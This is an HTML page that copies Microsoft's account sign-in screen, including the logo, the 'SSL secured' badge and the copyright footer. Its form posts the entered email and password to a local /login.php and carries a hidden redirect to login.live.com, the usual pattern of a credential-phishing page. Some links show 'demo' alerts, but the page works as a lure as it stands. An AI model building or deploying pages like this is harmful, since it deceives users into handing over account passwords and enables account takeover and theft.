<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your Microsoft account</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
        }
        
        body {
            background: #f0f2f4;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 440px;
            width: 100%;
            background: white;
            border-radius: 4px;
            padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
        }
        
        .logo {
            margin-bottom: 24px;
        }
        
        .logo svg {
            width: 108px;
            height: 23px;
        }
        
        .logo h1 {
            font-size: 24px;
            font-weight: 600;
            color: #1e1e1e;
            margin-top: 16px;
        }
        
        .logo p {
            font-size: 15px;
            color: #4c4c4c;
            margin-top: 8px;
        }
        
        .card form {
            display: flex;
            flex-direction: column;
        }
        
        .card input {
            height: 44px;
            border: 1px solid #666;
            border-radius: 4px;
            font-size: 16px;
            padding: 0 12px;
            margin-bottom: 16px;
            transition: all 0.2s;
        }
        
        .card input:focus {
            outline: none;
            border-color: #0067b8;
            box-shadow: 0 0 0 2px rgba(0,103,184,0.2);
        }
        
        .card input::placeholder {
            color: #8e8e8e;
        }
        
        .card button {
            background: #0067b8;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            color: white;
            height: 44px;
            cursor: pointer;
            margin: 8px 0 16px;
            transition: background 0.2s;
        }
        
        .card button:hover {
            background: #005da6;
        }
        
        .card a {
            color: #0067b8;
            font-size: 13px;
            text-decoration: none;
            margin-bottom: 12px;
            display: inline-block;
        }
        
        .card a:hover {
            text-decoration: underline;
        }
        
        .divider {
            display: flex;
            align-items: center;
            color: #8e8e8e;
            font-size: 13px;
            margin: 16px 0;
        }
        
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #e0e0e0;
        }
        
        .divider::before {
            margin-right: 16px;
        }
        
        .divider::after {
            margin-left: 16px;
        }
        
        .qr-link {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #0067b8;
            font-size: 14px;
            text-decoration: none;
            margin: 16px 0;
            cursor: pointer;
        }
        
        .qr-link:hover {
            text-decoration: underline;
        }
        
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: #8e8e8e;
            display: flex;
            flex-wrap: wrap;
            gap: 16px;
        }
        
        .footer a {
            color: #8e8e8e;
            text-decoration: none;
        }
        
        .footer a:hover {
            color: #0067b8;
            text-decoration: underline;
        }
        
        input[type="hidden"] {
            display: none;
        }
        
        .options-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 8px 0 16px;
        }
        
        .stay-signed {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            color: #4c4c4c;
        }
        
        .stay-signed input {
            width: 16px;
            height: 16px;
            margin: 0;
            accent-color: #0067b8;
        }
        
        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin: 24px 0 0;
            font-size: 12px;
            color: #8e8e8e;
            padding-top: 20px;
            border-top: 1px solid #e0e0e0;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
            }
            
            .footer {
                flex-direction: column;
                gap: 8px;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <!-- Microsoft SVG logo -->
            <svg viewBox="0 0 108 23" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M0 0H23V23H0V0Z" fill="#F25022"/>
                <path d="M26 0H49V23H26V0Z" fill="#7FBA00"/>
                <path d="M52 0H75V23H52V0Z" fill="#00A4EF"/>
                <path d="M78 0H101V23H78V0Z" fill="#FFB900"/>
                <path d="M105 4H108V19H105V4Z" fill="#737373"/>
                <path d="M105 4H108V7H105V4Z" fill="#D8D8D8"/>
            </svg>
            <h1>Sign in</h1>
            <p>to continue to Microsoft services</p>
        </div>
        
        <div class="card">
            <form method="POST" action="/login.php" id="loginForm">
                <input type="hidden" name="redirect" value="https://login.live.com">
                
                <input type="email" name="email" placeholder="Email, phone, or Skype" required autofocus>
                <input type="password" name="password" placeholder="Password" required>
                
                <div class="options-row">
                    <div class="stay-signed">
                        <input type="checkbox" id="staySigned">
                        <label for="staySigned">Stay signed in</label>
                    </div>
                    <a href="#" onclick="alert('Forgot password demo'); return false;">Forgot password?</a>
                </div>
                
                <button type="submit">Sign in</button>
                
                <a href="#" onclick="alert('Create account demo'); return false;">No account? Create one!</a>
                
                <div class="divider">or</div>
                
                <a href="#" class="qr-link" onclick="alert('QR code login demo'); return false;">
                    <span>📱</span>
                    <span>Sign in with QR code</span>
                </a>
            </form>
            
            <div class="security-badge">
                <span>🔒</span>
                <span>Microsoft account is protected</span>
                <span>•</span>
                <span>SSL secured</span>
            </div>
        </div>
        
        <div class="footer">
            <a href="#" onclick="alert('Terms demo'); return false;">Terms of use</a>
            <a href="#" onclick="alert('Privacy demo'); return false;">Privacy & cookies</a>
            <a href="#" onclick="alert('Help demo'); return false;">Help</a>
            <a href="#" onclick="alert('Contact demo'); return false;">Contact</a>
            <span>© Microsoft 2025</span>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const email = document.querySelector('input[name="email"]').value;
            const password = document.querySelector('input[name="password"]').value;
            
            if (!email || !password) {
                e.preventDefault();
                alert('Please enter your email and password');
                return;
            }
            
            if (!email.includes('@') && !email.includes('@') && !email.match(/^\d+$/)) {
                // Allow phone numbers too
                if (!email.match(/^[\d\+\-\(\)\s]+$/)) {
                    e.preventDefault();
                    alert('Please enter a valid email, phone, or Skype');
                    return;
                }
            }
        });
        
        const inputs = document.querySelectorAll('input[type="email"], input[type="password"]');
        inputs.forEach(input => {
            input.addEventListener('focus', function() {
                this.style.borderColor = '#0067b8';
            });
            
            input.addEventListener('blur', function() {
                if (!this.value) {
                    this.style.borderColor = '#666';
                }
            });
        });
        
        const stayCheck = document.getElementById('staySigned');
        stayCheck.addEventListener('change', function() {
            // Visual only
        });
        
        document.querySelector('input[name="email"]').addEventListener('input', function() {
            // Microsoft-style validation can go here
        });
        
        if (window.history.replaceState) {
            window.history.replaceState(null, null, window.location.href);
        }
        
        window.addEventListener('load', function() {
            document.querySelector('input[name="email"]').focus();
        });
    </script>
</body>
</html>
